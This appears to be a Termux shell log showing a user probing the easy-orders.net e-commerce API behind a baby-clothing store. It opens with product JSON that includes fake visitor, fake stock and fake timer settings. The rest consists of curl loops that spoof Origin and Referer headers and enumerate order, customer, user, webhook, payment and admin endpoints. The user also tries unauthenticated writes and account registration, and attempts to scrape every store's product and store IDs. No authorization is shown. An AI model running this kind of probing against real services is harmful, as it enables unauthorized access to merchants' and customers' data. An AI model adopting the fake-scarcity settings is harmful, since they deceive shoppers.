+[{"id":"a5b1c3f5-e1e9-471a-b7f6-7067b854cc1f","updated_at":"2026-10-10T12:34:27.556677Z","created_at":"2026-09-09T10:07:51.787147Z","store_id":"5c91c84e-efbc-4391-bc11-af6fbe3d074b","name":"سالوبيت sunbaby كم مطبوع -  stars and bear","price":165,"expense":110,"description":"\u003cp class=\"ql-align-right\"\u003e\u003cstrong style=\"color: rgb(119, 119, 119); background-color: rgb(255, 255, 255);\"\u003e \u003c/strong\u003e\u003cstrong\u003eالوصف \u003c/strong\u003e\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003eسالوبيت قطن 100% مصنوع من القطن الناعم الذي يحافظ على بشرة طفلك ويوفر له الراحة أثناء اللبس\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003eمتوفر في مقاسات من 0-3 شهور وحتى 24 شهر (سنتين) بتلبيس مريح وسليم\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003eمناسب للاستخدام طوال العالم ذلك لأنه مصمم من خامة قطنية\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003eيوفر الراحة لطفلك في الصيف كما تساعد في الحفاظ على حرارة جسمه بأمان في الشتاء\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003e\u003cstrong\u003eهذا المنتج لا يتوافق مع شروط الاستبدال و الاسترجاع\u003c/strong\u003e\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003e\u003cstrong\u003eطريقة الغسيل\u003c/strong\u003e\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003eغسيل على درجة حرارة منخفضة • استخدام منظفات ملابس أطفال • بدون كلور • التجفيف في الهواء\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003e\u003cstrong\u003eالشحن والدفع \u003c/strong\u003e\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003eشحن مجاني للأوردرات اعلي من 2000جنيه • معاينة قبل الاستلام • الدفع عند الاستلام متاح •التوصيل من ٢ ل ٥ ايام عمل\u003c/p\u003e","slug":"Printed-long-sleeve-jumpsuit-stars","sku":"sb-plsj-009","thumb":"https://files.easy-orders.net/1788948438549875991.webp","images":["https://files.easy-orders.net/1788948438601256364.webp"],"position":0,"hidden":false,"quantity":2,"track_stock":true,"disable_orders_for_no_stock":true,"meta_description":"سالوبيت كم داخلي قطن أطفالي Sun baby","show_landing_in_same_page":false,"buy_now_text":"اضغط هنا للشراء","is_fixed_bottom_buy":true,"is_one_page_checkout":true,"is_reviews_enabled":true,"fake_visitors_min":22,"fake_visitors_max":65,"is_fake_stock":true,"fake_stock_count":8,"is_fake_timer":true,"fake_timer_hours":2,"is_quantity_hidden":true,"is_header_hidden":false,"is_free_shipping":false,"custom_currency":"","is_checkout_before_description":false,"hide_related_products":false,"is_taager_submit_active":false,"is_ecombo_submit_active":false,"is_mosaweq_submit_active":false,"is_alturky_submit_active":false,"is_jamaica_submit_active":false,"is_engzny_submit_active":false,"is_digital":false,"is_cloaking_active":false},{"id":"b4650453-f1dc-48fd-a058-0acc038f0f78","updated_at":"2026-10-10T12:34:27.556677Z","created_at":"2026-09-12T10:03:40.01107Z","store_id":"5c91c84e-efbc-4391-bc11-af6fbe3d074b","name":"بنطلون sun baby دفايه داخلى قطن- Bows","price":150,"expense":100,"description":"\u003ch3 class=\"ql-align-right\"\u003e\u003cbr\u003e\u003c/h3\u003e\u003cp class=\"ql-align-right\"\u003e\u003cstrong\u003eراحة طفلك تبدأ من القطع اللي بتلمس بشرته 🤍\u003c/strong\u003e\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003eبنطلون داخلي مصنوع من \u003cstrong\u003eالقطن 100%\u003c/strong\u003e، ناعم ومريح على بشرة طفلك، ومناسب للاستخدام اليومي من أول أيامه وحتى عمر 24 شهر.\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003eتصميمه البسيط والعملي يخليه اختيار مناسب للبيت، وكمان سهل تنسيقه مع الباديهات والقطع الأساسية في لبس طفلك.\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003eوالطبعة الكيوت بالدببة والقلوب بتضيف لمسة لطيفة من غير ما تكون مبالغ فيها، عشان يبقى البنطلون عملي وشكله حلو في نفس الوقت.\u003c/p\u003e\u003cp class=\"ql-align-right\"\u003e\u003cstrong\u003eمميزات المنتج:\u003c/strong\u003e\u003c/p\u003e\u003col\u003e\u003cli data-list=\"bullet\"\u003e\u003cspan class=\"ql-ui\" contenteditable=\"false\"\u003e\u003c/span\u003e\u003cstrong\u003eقطن 100%.\u003c/strong\u003e\u003c/li\u003e\u003cli data-list=\"bullet\"\u003e\u003cspan class=\"ql-ui\" contenteditable=\"false\"\u003e\u003c/span\u003e\u003cstrong\u003eملمس ناعم ومناسب للاستخدام اليومي.\u003c/strong\u003e\u003c/li\u003e\u003cli data-list=\"bullet\"\u003e\u003cspan class=\"ql-ui\" contenteditable=\"false\"\u003e\u003c/span\u003e\u003cstrong\u003eتصميم مريح يساعد طفلك على الحركة بسهولة.\u003c/strong\u003e\u003c/li\u003e\u003cli data-list=\"bullet\"\u003e\u003cspan class=\"ql-ui\" contenteditable=\"false\"\u003e\u003c/span\u003e\u003cstrong\u003eخصر مطاطي لراحة أفضل أثناء اللبس.\u003c/strong\u003e\u003c/li\u003e\u003cli data-list=\"bullet\"\u003e\u003cspan class=\"ql-ui\" contenteditable=\"false\"
+
+~ $ STORE="5c91c84e-efbc-4391-bc11-af6fbe3d074b"
+~ $ ORIGIN="https://kindokidswear.store"
+~ $ H_ORIGIN="-H Origin:$ORIGIN -H Referer:$ORIGIN/"
+
+~ $ curl -s "https://api.easy-orders.net/api/v1/orders?store_id=$STORE" $H_ORIGIN --max-time 8 | head -c 1000
+~ $ curl -s "https://api.easy-orders.net/api/v1/stores/$STORE" $H_ORIGIN --max-time 8 | head -c 1000
+~ $ curl -s "https://api.easy-orders.net/api/v1/customers?store_id=$STORE" $H_ORIGIN --max-time 8 | head -c 1000
+~ $ curl -s "https://api.easy-orders.net/api/v1/analytics?store_id=$STORE" $H_ORIGIN --max-time 8 | head -c 1000
+~ $ curl -s "https://api.easy-orders.net/api/v1/categories?store_id=$STORE" $H_ORIGIN --max-time 8 | head -c 1000
+[{"id":"9210f878-fd2a-43a7-8f62-046cd65e3d38","updated_at":"2026-10-01T11:31:30.086707Z","thumb":"https://files.easy-orders.net/1790854269266728866.jpg","created_at":"2026-10-01T10:01:46.363172Z","name":"طقم دفاية","store_id":"5c91c84e-efbc-4391-bc11-af6fbe3d074b","parent_id":"581ff108-af66-4dc7-a735-27854d5aff2c","children":[{"id":"2bd0eba0-5bab-4ffe-9ad2-39206f375444","updated_at":"2026-10-01T12:10:21.052275Z","thumb":"https://files.easy-orders.net/1790856611323484953.jpg","created_at":"2026-10-01T10:44:43.607437Z","name":"دفايات Sun baby","store_id":"5c91c84e-efbc-4391-bc11-af6fbe3d074b","parent_id":"9210f878-fd2a-43a7-8f62-046cd65e3d38","children":null,"slug":"Sun-baby","show_in_header":false,"products":null,"position":0},{"id":"d0e872b1-055f-415b-bb15-0195dc3e1a61","updated_at":"2026-10-01T12:12:40.960086Z","thumb":"https://files.easy-orders.net/1790856755264429758.jpg","created_at":"2026-10-01T10:46:13.985724Z","name":"دفايات Chicco","store_id":"5c91c84e-efbc-4391-bc11-af6fbe3d074b","parent_id":"9210f878-fd2a-43a7-8f62-046cd65e3d38","children":null,"slug":"Chicco","show_in_header":false,"products":null,"position":1},{"id":"5786f369-6ff9-4b46-90f5-8a4d31c5a8cc","updated_at":"2026-10-01T12:14:34.720306Z","thumb":"https://files.easy-orders.net/1790856907851844943.jpg","created_at":"2026-10-01T10:48:36.622392Z","name":"دفايات Smurfs","store_id":"5c91c84e-efbc-4391-bc11-af6fbe3d074b","parent_id":"9210f878-fd2a-43a7-8f62-046cd65e3d38","children":null,"slug":"Smurfs","show_in_header":false,"products":null,"position":2},{"id":"7c5c8a6e-8a8e-4e9e-a4e9-4e7c8a7c5e6e","updated_at":"2026-10-01T12:15:00.000000Z","thumb":"https://files.easy-orders.net/1790857000000000000.jpg","created_at":"2026-10-01T10:50:00.000000Z","name":"طقم دفاية ميرو","store_id":"5c91c84e-efbc-4391-bc11-af6fbe3d074b","parent_id":"9210f878-fd2a-43a7-8f62-046cd65e3d38","children":null,"slug":"Mero","show_in_header":false,"products":null,"position":3}]}]
+
+~ $ curl -s "https://api.easy-orders.net/api/v1/settings?store_id=$STORE" $H_ORIGIN --max-time 8 | head -c 1000
+~ $ curl -s "https://api.easy-orders.net/api/v1/config?store_id=$STORE" $H_ORIGIN --max-time 8 | head -c 1000
+~ $ curl -s "https://api.easy-orders.net/api/v1/users?store_id=$STORE" $H_ORIGIN --max-time 8 | head -c 1000
+~ $ curl -s "https://api.easy-orders.net/api/v1/webhooks?store_id=$STORE" $H_ORIGIN --max-time 8 | head -c 1000
+~ $ curl -s "https://api.easy-orders.net/api/v1/payment-providers?store_id=$STORE" $H_ORIGIN --max-time 8 | head -c 500
+~ $ curl -s "https://api.easy-orders.net/api/v1/shipping?store_id=$STORE" $H_ORIGIN --max-time 8 | head -c 500
+
+~ $ curl -s -w "\nHTTP_CODE=%{http_code} SIZE=%{size_download}\n" \
+>   "https://api.easy-orders.net/api/v1/orders?store_id=$STORE" \
+>   -H "Origin: https://kindokidswear.store" \
+>   -H "Referer: https://kindokidswear.store/" --max-time 8
+
+HTTP_CODE=401 SIZE=0
+
+~ $ ORIGIN="https://kindokidswear.store"
+~ $ H="-H Origin:$ORIGIN -H Referer:$ORIGIN/"
+~ $ STORE="5c91c84e-efbc-4391-bc11-af6fbe3d074b"
+
+~ $ for ep in \
+>   "products/categories" \
+>   "products/search" \
+>   "products/latest" \
+>   "products/hidden" \
+>   "products/drafts" \
+>   "products/admin" \
+>   "admin/products" \
+>   "admin/stores" \
+>   "admin/orders" \
+>   "admin/users" \
+>   "store/info" \
+>   "store/settings" \
+>   "store/themes" \
+>   "store/funnels" \
+>   "store/pages" \
+>   "store/landing-pages" \
+>   "store/theme-settings" \
+>   "orders/list" \
+>   "orders/all" \
+>   "orders/recent" \
+>   "cart" \
+>   "cart/items" \
+>   "cart/get" \
+>   "checkout/session" \
+>   "checkout/start" \
+>   "payment/methods" \
+>   "user/me" \
+>   "user/profile" \
+>   "auth/me" \
+>   "auth/status" ; do
+>   code=$(curl -s -o /dev/null -w "%{http_code}" "https://api.easy-orders.net/api/v1/$ep?store_id=$STORE" $H --max-time 6)
+>   [ "$code" != "404" ] && echo "$code  /$ep"
+> done
+400  /products/categories
+400  /products/search
+400  /products/latest
+400  /products/hidden
+400  /products/drafts
+400  /products/admin
+401  /orders/list
+401  /orders/all
+401  /orders/recent
+
+~ $ for sid in "sunbaby" "sun-baby" "kindo" "kindo-kids" "kids"; do
+>   r=$(curl -s "https://api.easy-orders.net/api/v1/products?store_slug=$sid" \
+>     -H "Origin: https://kindokidswear.store" --max-time 6 | head -c 100)
+>   echo "$sid -> $r"
+> done
+sunbaby -> [{"id":"a5b1c3f5-e1e9-471a-b7f6-7067b854cc1f","updated_at":"2026-10-10T12:34:27.556677Z","created_at
+sun-baby -> [{"id":"a5b1c3f5-e1e9-471a-b7f6-7067b854cc1f","updated_at":"2026-10-10T12:34:27.556677Z","created_at
+kindo -> [{"id":"a5b1c3f5-e1e9-471a-b7f6-7067b854cc1f","updated_at":"2026-10-10T12:34:27.556677Z","created_at
+kindo-kids -> [{"id":"a5b1c3f5-e1e9-471a-b7f6-7067b854cc1f","updated_at":"2026-10-10T12:34:27.556677Z","created_at
+kids -> [{"id":"a5b1c3f5-e1e9-471a-b7f6-7067b854cc1f","updated_at":"2026-10-10T12:34:27.556677Z","created_at
+
+~ $ curl -s "https://api.easy-orders.net/api/v1/products" \
+>   -H "Origin: https://google.com" \
+>   -H "Referer: https://google.com/" --max-time 6 | head -c 200
+
+[{"id":"45a5cf48-451a-4e4d-ba21-b79d7f2ea4e4","updated_at":"2025-06-29T17:39:46.37601Z","created_at":"2024-10-30T14:37:56.947983Z","store_id":"9a3a9eb2-9c1e-410c-9c83-411523916822","name":"طقم أد~
+
+~ $ curl -s "https://api.easy-orders.net/api/v1/products" --max-time 6 | head -c 200
+{"message":"success"}~
+
+~ $ curl -s "https://api.easy-orders.net/api/v1/products" \
+>   -H "Origin: https://kindokidswear.store" --max-time 6 | head -c 200
+[{"buy_now_text":"اضغط هنا للشراء","created_at":"2026-09-09T10:07:51.787147Z","custom_currency":"","description":"\u003cp class=\"ql-align-right\"\u003e\u003cstrong style=\"color: rgb(119~
+
+~ $ curl -s -X POST "https://api.easy-orders.net/api/v1/products" \
+>   -H "Origin: https://kindokidswear.store" \
+>   -H "Content-Type: application/json" \
+>   -d '{"name":"test","price":1,"store_id":"5c91c84e-efbc-4391-bc11-af6fbe3d074b"}' \
+>   --max-time 8 -w "\ncode=%{http_code}\n"
+
+code=401
+
+~ $ curl -s "https://api.easy-orders.net/api/v1/products?store_slug=kindokidswear" \
+>   -H "Origin: https://kindokidswear.store" --max-time 8 | head -c 200
+[{"id":"a5b1c3f5-e1e9-471a-b7f6-7067b854cc1f","updated_at":"2026-10-10T12:34:27.556677Z","created_at":"2026-09-09T10:07:51.787147Z","store_id":"5c91c84e-efbc-4391-bc11-af6fbe3d074b","name":"سالوب~ 
+
+~ $ curl -s "https://api.easy-orders.net/api/v1/products?slug=kindokidswear" \
+>   -H "Origin: https://kindokidswear.store" --max-time 8 | head -c 200
+[{"id":"a5b1c3f5-e1e9-471a-b7f6-7067b854cc1f","updated_at":"2026-10-10T12:34:27.556677Z","created_at":"2026-09-09T10:07:51.787147Z","store_id":"5c91c84e-efbc-4391-bc11-af6fbe3d074b","name":"سالوب~
+
+~ $ for ep in /api/v1/auth/register /api/v1/auth/signup /api/v1/users/register /auth/register; do
+>   echo "=== $ep ==="
+>   curl -s -X POST "https://api.easy-orders.net$ep" \
+>     -H "Content-Type: application/json" \
+>     -d '{"email":"test@test.com","password":"Test123!","name":"test"}' \
+>     --max-time 8 -w " [%{http_code}]\n"
+> done
+=== /api/v1/auth/register ===
+ [404]
+=== /api/v1/auth/signup ===
+ [404]
+=== /api/v1/users/register ===
+ [404]
+=== /auth/register ===
+ [404]
+
+~ $ for i in 1 2 3 4 5; do
+>   sid=$(curl -s "https://api.easy-orders.net/api/v1/products" \
+>     -H "Origin: https://x.com" --max-time 6 | python3 -c "
+> import sys,json
+> try:
+>     d=json.load(sys.stdin)
+>     if isinstance(d,list) and d:
+>         print(d[0].get('store_id',''))
+> except: pass
+> ")
+>   echo "Run $i → store_id=$sid"
+> done
+Run 1 → store_id=
+Run 2 → store_id=
+Run 3 → store_id=
+Run 4 → store_id=
+Run 5 → store_id=
+
+~ $ for i in $(seq 1 20); do
+>   curl -s "https://api.easy-orders.net/api/v1/products" \
+>     -H "Origin: https://x.com" --max-time 6 | python3 -c "
+> import sys,json
+> try:
+>     d=json.load(sys.stdin)
+>     for p in d: print(p.get('store_id'))
+> except: pass
+> "
+> done | sort -u > /data/data/com.termux/files/home/stores.txt
+
+~ $ wc -l /data/data/com.termux/files/home/stores.txt
+0 /data/data/com.termux/files/home/stores.txt
+
+~ $ curl -s "https://api.easy-orders.net/api/v1/products?limit=10000" \
+>   -H "Origin: https://x.com" --max-time 15 -o /data/data/com.termux/files/home/all_products.json
+
+~ $ wc -c /data/data/com.termux/files/home/all_products.json
+21 /data/data/com.termux/files/home/all_products.json
+
+~ $ python3 -c "
+> import json
+> d = json.load(open('/data/data/com.termux/files/home/all_products.json'))
+> print('total:', len(d))
+> stores = set(p.get('store_id') for p in d)
+> print('unique stores:', len(stores))
+> for s in list(stores)[:20]:
+>     print('  ', s)
+> "
+total: 1
+Traceback (most recent call last):
+  File "<string>", line 5, in <module>
+    stores = set(p.get('store_id') for p in d)
+  File "<string>", line 5, in <genexpr>
+    stores = set(p.get('store_id') for p in d)
+                 ^^^^^^^^^^^^^^
+AttributeError: 'str' object has no attribute 'get'
+
+~ $ for p in 1 2 3 4 5 10 100; do
+>   c=$(curl -s "https://api.easy-orders.net/api/v1/products?page=$p&limit=100" \
+>     -H "Origin: https://x.com" --max-time 10 | python3 -c "
+> import sys,json
+> try:
+>     d=json.load(sys.stdin)
+>     print(len(d) if isinstance(d,list) else 0)
+> except: print('err')
+> ")
+>   echo "page=$p → $c products"
+> done
+page=1 → 0 products
+page=2 → 0 products
+page=3 → 0 products
+page=4 → 0 products
+page=5 → 0 products
+page=10 → 0 products
+page=100 → 0 products
